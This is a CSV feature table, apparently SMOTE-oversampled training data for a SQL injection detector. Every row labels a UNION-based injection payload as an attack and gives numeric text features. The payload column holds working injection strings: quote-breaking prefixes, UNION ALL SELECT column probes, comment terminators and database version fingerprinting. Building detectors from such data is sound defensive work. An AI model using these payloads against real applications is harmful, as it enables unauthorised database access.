id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000165,attack,union,"-3819'   )    )     )   union all select 9014,9014,9014,9014,9014,9014--",nearest_attack_euclidean,R000099,0.6940615602922012,72.23387210570603,21.46774421141206,3.761542289623788,14.0,28.0,18.0,12.23387210570603,0.19382149743533403,0.387642994870668,0.24919906813114373,0.1693364395628542,1.0,0.0,3.0,0.0,0.0,0.0,0.0,3.0,0.23387210570602984,0.0,5.0,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000166,attack,union,1'+  (  select 'wyxu' where 2555  =  2555 union all select null#,nearest_attack_euclidean,R000207,1.6810992745121773,69.8893813904606,26.944690695230303,4.076423187649885,31.036872869846466,16.361726738075753,15.0,7.490781782538384,0.4498376393472397,0.2265925326321346,0.2162128452185631,0.10735698280206257,2.018436434923233,0.0,0.49078178253838356,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.9815635650767676,2.4907817825383836,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000167,attack,union,"-2085""  )   as hkev where 7730  =  7730 union all select 7730,7730--",nearest_attack_euclidean,R000103,0.2931105772960045,69.95128570750053,26.414614287749842,4.068552700837807,25.0,21.561028566000424,16.0,7.390257141500106,0.3584498222685684,0.3067730445584499,0.22940788625188377,0.10536924692109795,0.0,1.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.3902571415001055,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000168,attack,union,"1 union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000302,0.1911867003867212,70.0,14.070540163510191,2.9160005212942233,53.717839345959234,1.0,4.28216065404076,11.0,0.7673977049422749,0.01428571428571429,0.061173723629153715,0.15714285714285714,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0705401635101901,0.0,0.0,8.929459836489809,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0705401635101901,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000169,attack,union," select * from users where id  =  1<@<@ union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000024,0.03437264951195241,76.94693275784616,26.053067242153844,3.921089370458827,40.0,2.9469327578461577,23.0,11.0,0.5198432484084337,0.038289990444397765,0.2989098678348493,0.14295689331231926,0.0,0.0,2.0,0.0,1.0000000000000002,1.0,0.0,2.0,0.0,0.0,1.0,5.946932757846157,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000170,attack,union,"1   )    )     )   union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000217,0.6238043672863862,77.49051300545659,15.248418834242766,3.0470180461611824,46.99367533697106,1.0,18.0,11.49683766848553,0.606379288728947,0.012918723843797053,0.23253702918834745,0.14816495823890852,0.2484188342427649,0.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,7.248418834242765,0.0,0.2484188342427647,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000171,attack,union,"-5524  )   as eoyk where 6928  =  6928 union all select 6928,6928,6928,6928,6928,6928,6928,6928,6928--",nearest_attack_euclidean,R000077,0.4027558268324705,98.71987796272579,25.24304876062903,3.871756271803198,23.486097521258056,46.99073168083871,15.495365840419353,12.747682920209677,0.23712106169863154,0.4765918141919707,0.1569739224850365,0.12931320162436127,0.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,7.747682920209676,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000172,attack,union,"1'||  (  select 'xhqy' where 4531  =  4531 union all select null,null--",nearest_attack_euclidean,R000102,1.0313417568853855,79.56488540044896,27.0,4.136393782579506,43.85190832035916,9.0,15.0,11.71297708008979,0.5426449347708272,0.11697957510416945,0.1949659585069491,0.14540953161805426,3.0,0.0,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,2.7129770800897894,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000173,attack,union,"-6405  )   as ilah where 5145  =  5145 union all select 5145,5145,5145,5145,5145--",nearest_attack_euclidean,R000215,0.2223391535908955,80.33712809336198,23.415717976659504,3.8597023802581383,23.752846070021484,32.0,15.584282023340496,9.0,0.29487560570331445,0.39901316760257366,0.19388877330588808,0.11222245338822383,0.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,4.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000174,attack,union,"1'   )    )     )   union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000166,0.007788228173244229,81.93463362312934,16.0,3.0734912404581105,49.9607801738776,1.0,17.986926724625867,12.986926724625867,0.6097663833795233,0.012207979224404142,0.21953276675904662,0.1584928706370259,1.0,0.0,0.0,0.0,0.0,0.0,0.0,2.996731681156467,0.0,0.0,7.9901950434694005,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000175,attack,union,"1' in boolean mode  )   union all select null,null,null,null#",nearest_attack_euclidean,R000173,0.4839440958606271,57.6278999138625,19.0,3.630326689969264,40.30231993109,1.0,11.0,5.3255799827725,0.6986312502412094,0.017477370648067342,0.19225107712874076,0.09164030198198247,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,2.3255799827724997,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000176,attack,union,"-9795  )   as wrgs where 5427  =  5427 union all select 5427,5427,5427,5427,5427,5427--",nearest_attack_euclidean,R000048,0.9628653720229402,90.5501759561447,25.591077712719454,3.977005614188209,22.54646627631672,41.45724340351126,15.182155425438907,11.364310850877816,0.2498655486593386,0.4549854771148917,0.17008174855543895,0.12506722567033068,0.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,6.364310850877815,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000177,attack,union,"1   )    )     )   union all select null,null#",nearest_attack_euclidean,R000161,0.2468087938237905,46.06635157383339,15.06635157383338,3.055653235825636,22.26540629533352,1.0,17.73459370466648,5.06635157383338,0.4832326341170248,0.021708440530141787,0.38510498708864815,0.10995393826418527,0.0,0.06635157383337983,0.0,0.0,0.0,0.0,0.0,2.93364842616662,0.0,0.0,1.0663515738333795,0.0,0.0,0.06635157383337983,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000178,attack,union," select * from users where id  =  '1' or \.<$ union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000034,0.03281622345917322,76.0,33.85766424916956,4.462563213919766,42.0,3.0,17.0,14.0,0.5526315789473685,0.03947368421052633,0.2236842105263158,0.18421052631578946,3.0,0.0,2.0,0.0,1.0000000000000002,1.0,0.0,0.0,0.0,0.0,1.0,5.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000179,attack,union,"-7007  )   union all select 6704,6704--",nearest_attack_euclidean,R000240,0.7289643719770997,36.93046404991429,17.08020624440635,3.7074569312796797,14.919793755593647,9.47056717211747,8.0,4.540103122203176,0.4143978288626941,0.24460388984069217,0.2192788782911843,0.12171940300542941,0.0,0.0,2.7700515611015883,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.7700515611015879,2.7700515611015883,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000180,attack,union,"1"" where 7249  =  7249 union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000293,0.05707337182002521,91.28429519633491,23.042644279450236,3.5990451028740194,59.08528855890047,9.0,10.17057711780094,13.028429519633491,0.647459443844786,0.0986477916278572,0.11114538815528527,0.14274737637207147,0.0,1.0,2.0,0.0,0.0,1.0,0.0,0.028429519633490052,0.0,0.0,9.0,3.0,0.0,1.0,1.0,0.0,0.0,1.0,0.014214759816745026,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000181,attack,union,"-3862'   )    )    union all select 2495,2495,2495,2495,2495,2495,2495--",nearest_attack_euclidean,R000126,0.044552215171674,72.16207663328377,22.032415326656754,3.846176007716183,14.0,32.0,14.12966130662702,12.032415326656755,0.19403516001696017,0.4435089371816232,0.19571907309003836,0.16673682971137826,1.0,0.0,3.0,0.0,0.0,0.0,0.0,2.032415326656755,0.0,0.0,6.0,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000182,attack,union,"-2787'   )    )    union all select 1996,1996,1996,1996,1996,1996,1996,1996#",nearest_attack_euclidean,R000307,0.9940811642401689,75.68856674687177,23.24573301251291,3.82908110498063,18.048632290666962,33.50853397497418,13.065700240615316,11.065700240615316,0.23895721397096212,0.44243161038783396,0.17251811997027355,0.1460930556709303,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.6885667468717722,0.0,0.0,6.377133493743544,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000183,attack,union,"-3794'  )   union all select 2485,2485,2485,2485,2485--",nearest_attack_euclidean,R000042,0.06921673229847003,54.48121580476631,22.0,4.043610461069524,14.0,23.584972643813046,8.0,8.896243160953262,0.25718653772118966,0.4325906603983004,0.14696373584067982,0.16325906603983004,1.0,0.0,3.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,3.896243160953262,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000184,attack,union,"-6478""   )    )    union all select 7087,7087,7087,7087,7087,7087,7087,7087--",nearest_attack_euclidean,R000119,0.3088884882653417,79.50670089041161,19.74932991095884,3.514064164264082,14.0,38.00536071232928,14.0,13.50134017808232,0.17657951747040418,0.4771117394826895,0.17657951747040418,0.16972922557650214,0.0,1.0,3.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,7.50134017808232,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000185,attack,union,"-4028  )   where 3244  =  3244 union all select 3244,3244,3244,3244,3244,3244,3244,3244--",nearest_attack_euclidean,R000125,1.5935088514164157,92.81183975026076,23.847075500057947,3.589785789885192,19.0,47.38830200023178,14.0,12.423537750028974,0.20517943645322698,0.5097268893612882,0.15118484791290407,0.13390882627258077,0.0,0.0,2.1529244999420545,0.0,0.0,1.0,0.0,1.0,0.0,0.0,7.8470755000579455,3.1529244999420545,0.0,0.0,0.5764622499710271,0.4235377500289729,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000186,attack,union,"-4694%""   )    )     )   union all select 9178,9178,9178,9178,9178--",nearest_attack_euclidean,R000222,0.5785727999290087,67.82373269709176,22.0,3.836585623640453,14.0,24.705069211632956,17.294930788367044,11.82373269709176,0.20642399961385324,0.364393134692897,0.2548788641486627,0.17430400154458706,0.0,1.0,3.0,0.0,0.0,0.0,0.0,2.823732697091761,0.8237326970917607,0.0,4.176267302908239,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000187,attack,union,"-3721'  )   union all select 9050,9050--",nearest_attack_euclidean,R000045,0.4942972438592773,43.53686548291327,22.0,4.07344968982912,14.0,14.829492386330621,8.0,6.707373096582655,0.3274926741996428,0.33215332257193886,0.18713867097122447,0.1532153322571939,1.0,0.0,3.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.7073730965826552,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000188,attack,union,"-7794""  )   union all select 3910,3910,3910,3910,3910,3910,3910,3910,3910,3910#",nearest_attack_euclidean,R000057,0.030072435644504434,78.76784665354214,21.976784665354213,3.7556456986516618,14.0,43.8142773228337,8.0,12.953569330708426,0.1778114376904073,0.5561443140245843,0.10160653582308989,0.16443771246191852,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,8.953569330708426,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000189,attack,union,"1'   )    )    as ticp where 9794  =  9794 union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000221,0.526629708824391,99.13683804628828,23.661243281143324,3.71577789025045,56.66124328114332,9.0,20.64497312457329,12.830621640571662,0.5722756658698618,0.09095362569674428,0.20727523086507815,0.12949547756831575,0.8306216405716617,0.0,2.0,0.0,0.0,1.0,0.0,1.8306216405716618,0.0,0.0,7.169378359428338,3.0,0.8306216405716618,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000190,attack,union," select * from users where id  =  '1' or \<\. union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000038,0.5165217781551166,76.6167394006302,32.55947185669272,4.397302618005384,42.08810562866146,3.0881056286614577,17.704845029291654,13.735683114015629,0.5495867109942617,0.040241884840897274,0.2305142124945232,0.17965719167031785,2.9118943713385432,0.08810562866145691,2.0,0.0,1.0000000000000002,1.0,0.0,0.17621125732291354,0.0,0.0,1.0,4.911894371338543,1.0,0.08810562866145691,1.0,0.08810562866145699,0.0,1.0,0.08810562866145699,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000191,attack,union,"-3819'   )    )     )   union all select 9014,9014,9014,9014,9014,9014--",nearest_attack_euclidean,R000099,0.19065766565657596,73.17261176845933,21.46904470738373,3.758497720980342,14.0,28.93808941476746,18.0,12.234522353691865,0.1914833036150017,0.39514958664256783,0.24619281893357362,0.16717429080885685,1.0,0.0,3.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,5.234522353691865,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000192,attack,union,"-9904""   )    )    union all select 9080,9080,9080,9080,9080--",nearest_attack_euclidean,R000148,0.014385602711898671,62.0,19.03556556689169,3.601554075945803,14.0,24.0,14.0,10.0,0.22580645161290322,0.3870967741935484,0.22580645161290322,0.16129032258064516,0.0,1.0,3.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,4.0,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000193,attack,union,-6947'   )    )    as qqjp where 6700  =  6700 union all select 6700#,nearest_attack_euclidean,R000279,1.5548690438002157,69.43023281706735,24.848835914663255,3.8255805507805776,31.02325943894289,12.988370280528555,18.558137463461208,6.860465634134698,0.44613852605804877,0.18743557438579558,0.26771146231953236,0.09871443723662321,1.0,0.0,0.5697671829326507,0.0,0.0,1.0,0.0,1.5697671829326507,0.0,0.0,1.7209312682693971,1.5697671829326507,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000194,attack,union,"1'  )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000132,0.821689191431916,66.23660528994363,16.0,3.1908233860708037,43.74553509664787,1.0,10.618302644971813,10.872767548323937,0.6630451872261145,0.015217470179666792,0.15760692095749643,0.1641304216367222,1.0,0.0,2.0,0.0,0.0,0.0,0.0,1.436383774161969,0.0,0.0,6.436383774161969,2.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000195,attack,union,"1""  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000244,1.3615867015241958,55.460401975434756,16.46040197543476,3.2712444486050254,38.0,1.0,8.0,8.46040197543476,0.6852288067965842,0.018032337020962713,0.14425869616770193,0.1524801600147512,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.460401975434759,0.0,5.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000196,attack,union,"-2787' union all select 3622,3622,3622,3622,3622,3622,3622,3622,3622,3622#",nearest_attack_euclidean,R000090,0.19744196132238243,72.35533136361339,19.835533136361338,3.4294811950834565,14.0,42.68426509089071,4.0,11.671066272722678,0.1940509630298591,0.5893160972818674,0.05544313229424547,0.1611898073940282,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.671066272722676,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000197,attack,union,"1%""   )    )     )   union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000213,0.1172133701030578,78.96767256205781,17.0,3.1897601454307862,46.0,1.0,18.0,13.967672562057807,0.5825198088518891,0.012663474105475858,0.2279425338985653,0.17687418314406972,0.0,1.0,1.9353451241156157,0.0,0.0,0.0,0.0,3.0,1.0,0.0,7.0,1.9353451241156159,0.0,1.0,0.9676725620578079,0.03232743794219217,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
